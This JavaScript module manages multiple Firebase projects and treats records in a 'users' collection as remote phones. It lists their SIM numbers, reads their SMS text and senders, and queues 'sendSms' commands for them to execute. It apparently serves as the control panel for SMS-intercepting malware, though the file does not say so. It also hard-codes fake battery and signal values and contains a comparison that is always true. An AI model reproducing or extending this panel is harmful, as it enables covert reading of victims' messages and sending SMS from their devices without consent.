/**
 * FIREBASE MANAGER
 * Handles multiple Firebase connections, data fetching, and real-time updates
 * Reads configs from firebase-configs.json file only
 */

// ────────────────────────────────────────────────
// STATE
// ────────────────────────────────────────────────

let firebaseInstances = {};
let allDevices = [];
let deviceListeners = {};
let isInitialized = false;
let firebaseConfigsCache = null;

// ────────────────────────────────────────────────
// CONFIG LOADING - FROM JSON FILE ONLY
// ────────────────────────────────────────────────

/**
 * Load Firebase configs from JSON file
 */
async function loadFirebaseConfigs() {
    console.log('📢 Loading Firebase configs from JSON file...');
    try {
        // Force fresh load from JSON file
        const response = await fetch('data/firebase-configs.json?' + Date.now());
        if (response.ok) {
            const data = await response.json();
            firebaseConfigsCache = data;
            // Also save to localStorage as backup
            localStorage.setItem('firebase_configs', JSON.stringify(data));
            console.log('✅ Firebase configs loaded from JSON file:', data.sources ? data.sources.length : 0, 'sources');
            return data;
        } else {
            console.log('⚠️ Could not load firebase-configs.json, status:', response.status);
        }
    } catch (e) {
        console.log('⚠️ Error loading firebase-configs.json:', e.message);
    }
    
    // Fallback: try localStorage
    try {
        const data = localStorage.getItem('firebase_configs');
        if (data) {
            const parsed = JSON.parse(data);
            if (parsed.sources && parsed.sources.length > 0) {
                console.log('📢 Firebase configs loaded from localStorage fallback');
                firebaseConfigsCache = parsed;
                return parsed;
            }
        }
    } catch (e) {
        console.error('Error loading from localStorage:', e);
    }
    
    console.log('📢 No Firebase configs found');
    return { sources: [] };
}

/**
 * Get all Firebase sources
 */
async function getAllFirebaseSources() {
    const configs = await loadFirebaseConfigs();
    return configs.sources || [];
}

// ────────────────────────────────────────────────
// INITIALIZATION
// ────────────────────────────────────────────────

async function initFirebaseConnections() {
    try {
        const configs = await loadFirebaseConfigs();
        console.log('📢 Firebase configs loaded:', configs);
        
        if (!configs || !configs.sources || configs.sources.length === 0) {
            console.log('📢 No Firebase sources configured');
            return false;
        }

        console.log(`📢 Connecting to ${configs.sources.length} Firebase source(s)...`);
        
        let successCount = 0;
        for (const source of configs.sources) {
            console.log(`📢 Connecting to Firebase: ${source.id}`);
            const connected = await connectToFirebase(source);
            if (connected) {
                successCount++;
                console.log(`✅ Connected to Firebase: ${source.id}`);
            } else {
                console.log(`❌ Failed to connect to Firebase: ${source.id}`);
            }
        }

        isInitialized = true;
        console.log(`📢 Connected to ${successCount}/${configs.sources.length} Firebase sources`);
        return successCount > 0;
    } catch (error) {
        console.error('❌ Error initializing Firebase:', error);
        return false;
    }
}

async function connectToFirebase(source) {
    try {
        const { id, url, key } = source;
        
        if (firebaseInstances[id] && firebaseInstances[id].connected) {
            return true;
        }

        console.log(`📢 Connecting to Firebase source: ${id}`);
        console.log(`📢 URL: ${url}`);

        const firebaseConfig = {
            apiKey: key,
            authDomain: url.replace('https://', '').replace('.firebaseio.com', '.firebaseapp.com'),
            databaseURL: url,
            projectId: url.replace('https://', '').replace('.firebaseio.com', ''),
            storageBucket: url.replace('https://', '').replace('.firebaseio.com', '.appspot.com'),
        };

        let app;
        try {
            app = firebase.app(id);
            console.log('📢 Using existing Firebase app');
        } catch (e) {
            app = firebase.initializeApp(firebaseConfig, id);
            console.log('📢 Created new Firebase app');
        }

        const db = firebase.firestore(app);
        
        console.log('📢 Testing Firebase connection...');
        const testSnapshot = await db.collection('users').limit(1).get();
        console.log(`📢 Test query returned ${testSnapshot.size} documents`);

        firebaseInstances[id] = {
            app: app,
            db: db,
            config: source,
            connected: true
        };

        console.log(`✅ Connected to Firebase: ${id}`);
        return true;
    } catch (error) {
        console.error(`❌ Failed to connect to Firebase ${source.id}:`, error);
        firebaseInstances[source.id] = {
            config: source,
            connected: false,
            error: error.message
        };
        return false;
    }
}

function disconnectFromFirebase(sourceId) {
    try {
        if (firebaseInstances[sourceId]) {
            if (deviceListeners[sourceId]) {
                deviceListeners[sourceId].forEach(unsubscribe => unsubscribe());
                delete deviceListeners[sourceId];
            }
            if (firebaseInstances[sourceId].app) {
                firebaseInstances[sourceId].app.delete();
            }
            delete firebaseInstances[sourceId];
            console.log(`📢 Disconnected from Firebase: ${sourceId}`);
        }
    } catch (error) {
        console.error(`❌ Error disconnecting from Firebase ${sourceId}:`, error);
    }
}

// ────────────────────────────────────────────────
// DEVICE MANAGEMENT - USING "users" COLLECTION
// ────────────────────────────────────────────────

async function fetchAllDevices() {
    allDevices = [];
    const sources = Object.keys(firebaseInstances);

    console.log(`📢 Fetching devices from ${sources.length} sources...`);

    for (const sourceId of sources) {
        const instance = firebaseInstances[sourceId];
        if (!instance.connected) {
            console.log(`⚠️ Source ${sourceId} is not connected, skipping...`);
            continue;
        }

        try {
            console.log(`📢 Fetching devices from ${sourceId}...`);
            const devices = await fetchDevicesFromSource(sourceId);
            console.log(`📢 Found ${devices.length} devices in ${sourceId}`);
            allDevices = allDevices.concat(devices);
        } catch (error) {
            console.error(`❌ Error fetching devices from ${sourceId}:`, error);
        }
    }

    console.log(`📢 Total devices found: ${allDevices.length}`);
    return allDevices;
}

async function fetchDevicesFromSource(sourceId) {
    const instance = firebaseInstances[sourceId];
    if (!instance || !instance.connected) {
        throw new Error('Firebase not connected');
    }

    try {
        console.log(`📢 Querying users collection from ${sourceId}...`);
        const snapshot = await instance.db.collection('users').get();
        const devices = [];

        console.log(`📢 Snapshot size: ${snapshot.size} documents`);

        if (snapshot.empty) {
            console.log('⚠️ No devices found in users collection');
            return [];
        }

        snapshot.forEach(doc => {
            const data = doc.data();
            const commandData = data.commands || data;
            
            const device = {
                id: doc.id,
                sourceId: sourceId,
                name: commandData.body ? commandData.body.substring(0, 20) : doc.id.substring(0, 8),
                number: commandData.number || commandData.to || 'N/A',
                status: commandData.status === 'pending' ? 'offline' : 'online',
                battery: 50,
                signal: '4G',
                model: commandData.simSlot !== undefined ? `SIM ${parseInt(commandData.simSlot) + 1}` : 'Unknown',
                lastSeen: commandData.timestamp ? new Date(commandData.timestamp).toISOString() : new Date().toISOString(),
                sims: commandData.number ? [commandData.number] : ['N/A'],
                unread: 0,
                raw: data,
                _commandData: commandData,
                smsBody: commandData.body || commandData.message || commandData.text || '',
                smsSender: commandData.number || commandData.from || 'Unknown',
                smsTime: commandData.timestamp ? new Date(commandData.timestamp).toISOString() : new Date().toISOString()
            };
            
            devices.push(device);
            console.log(`✅ Parsed device: ${device.id.substring(0, 8)}...`);
        });

        return devices;
    } catch (error) {
        console.error(`❌ Error fetching devices from ${sourceId}:`, error);
        throw error;
    }
}

function listenToDevices(callback) {
    Object.keys(deviceListeners).forEach(sourceId => {
        deviceListeners[sourceId].forEach(unsubscribe => unsubscribe());
    });
    deviceListeners = {};

    const sources = Object.keys(firebaseInstances);
    console.log(`📢 Setting up listeners for ${sources.length} sources...`);

    for (const sourceId of sources) {
        const instance = firebaseInstances[sourceId];
        if (!instance.connected) continue;

        console.log(`📢 Setting up listener for ${sourceId}...`);
        const unsubscribe = instance.db.collection('users')
            .onSnapshot((snapshot) => {
                console.log(`📢 Device update detected in ${sourceId}`);
                fetchAllDevices().then(() => {
                    if (callback) callback(allDevices);
                });
            }, (error) => {
                console.error(`❌ Error listening to devices from ${sourceId}:`, error);
            });

        if (!deviceListeners[sourceId]) {
            deviceListeners[sourceId] = [];
        }
        deviceListeners[sourceId].push(unsubscribe);
    }
}

// ────────────────────────────────────────────────
// SMS MANAGEMENT - USING "users" COLLECTION
// ────────────────────────────────────────────────

async function fetchSmsForDevice(deviceId, sourceId, simNumber, limit = 100) {
    const instance = firebaseInstances[sourceId];
    if (!instance || !instance.connected) {
        throw new Error('Firebase not connected');
    }

    try {
        console.log(`📢 Fetching SMS for device: ${deviceId}, SIM: ${simNumber}`);
        
        const doc = await instance.db.collection('users').doc(deviceId).get();
        
        if (!doc.exists) {
            console.log('⚠️ Device document not found');
            return [];
        }
        
        const data = doc.data();
        const commandData = data.commands || data;
        
        if (commandData.action === 'sendSms' || commandData.type === 'sendSms') {
            const messages = [{
                id: doc.id,
                sender: commandData.number || commandData.from || 'Unknown',
                body: commandData.body || commandData.message || commandData.text || '',
                time: commandData.timestamp ? new Date(commandData.timestamp).toISOString() : new Date().toISOString(),
                simNumber: commandData.number || 'N/A',
                type: commandData.type || 'incoming',
                raw: commandData
            }];
            
            console.log(`📢 Found 1 SMS message`);
            return messages;
        }
        
        return [];
    } catch (error) {
        console.error(`❌ Error fetching SMS for device ${deviceId}:`, error);
        return [];
    }
}

function listenToSms(deviceId, sourceId, simNumber, callback) {
    const instance = firebaseInstances[sourceId];
    if (!instance || !instance.connected) {
        console.error('❌ Firebase not connected');
        return null;
    }

    console.log(`📢 Setting up SMS listener for device: ${deviceId}, SIM: ${simNumber}`);

    const unsubscribe = instance.db.collection('users').doc(deviceId)
        .onSnapshot((docSnapshot) => {
            console.log(`📢 SMS update detected for device: ${deviceId}`);
            
            if (!docSnapshot.exists) {
                if (callback) callback([]);
                return;
            }
            
            const data = docSnapshot.data();
            const commandData = data.commands || data;
            
            if (commandData.action === 'sendSms' || commandData.type === 'sendSms') {
                const messages = [{
                    id: docSnapshot.id,
                    sender: commandData.number || commandData.from || 'Unknown',
                    body: commandData.body || commandData.message || commandData.text || '',
                    time: commandData.timestamp ? new Date(commandData.timestamp).toISOString() : new Date().toISOString(),
                    simNumber: commandData.number || 'N/A',
                    type: commandData.type || 'incoming',
                    raw: commandData
                }];
                if (callback) callback(messages);
            } else {
                if (callback) callback([]);
            }
        }, (error) => {
            console.error('❌ Error listening to SMS:', error);
        });

    return unsubscribe;
}

// ────────────────────────────────────────────────
// SEND SMS - USING "users" COLLECTION
// ────────────────────────────────────────────────

async function sendSms(deviceId, sourceId, simNumber, toNumber, message) {
    const instance = firebaseInstances[sourceId];
    if (!instance || !instance.connected) {
        throw new Error('Firebase not connected');
    }

    try {
        console.log(`📢 Sending SMS from ${simNumber} to ${toNumber}`);
        
        const smsData = {
            Action: "sendSms",
            action: "sendSms",
            body: message,
            command: "sendSms",
            from: simNumber === simNumber ? 1 : 0,
            isSended: false,
            message: message,
            number: toNumber,
            sim: simNumber === simNumber ? 1 : 0,
            simSlot: simNumber === simNumber ? 1 : 0,
            status: "pending",
            text: message,
            timestamp: Date.now(),
            to: toNumber,
            type: "sendSms"
        };

        await instance.db.collection('users').doc(deviceId).set({
            commands: smsData
        }, { merge: true });
        
        console.log(`✅ SMS sent successfully`);
        
        return {
            success: true,
            id: deviceId,
            message: 'SMS sent successfully'
        };
    } catch (error) {
        console.error('❌ Error sending SMS:', error);
        throw error;
    }
}

// ────────────────────────────────────────────────
// EXPOSE TO GLOBAL SCOPE
// ────────────────────────────────────────────────

window.loadFirebaseConfigs = loadFirebaseConfigs;
window.getAllFirebaseSources = getAllFirebaseSources;
window.initFirebaseConnections = initFirebaseConnections;
window.connectToFirebase = connectToFirebase;
window.disconnectFromFirebase = disconnectFromFirebase;
window.fetchAllDevices = fetchAllDevices;
window.fetchDevicesFromSource = fetchDevicesFromSource;
window.listenToDevices = listenToDevices;
window.fetchSmsForDevice = fetchSmsForDevice;
window.listenToSms = listenToSms;
window.sendSms = sendSms;
window.firebaseInstances = firebaseInstances;
window.allDevices = allDevices;
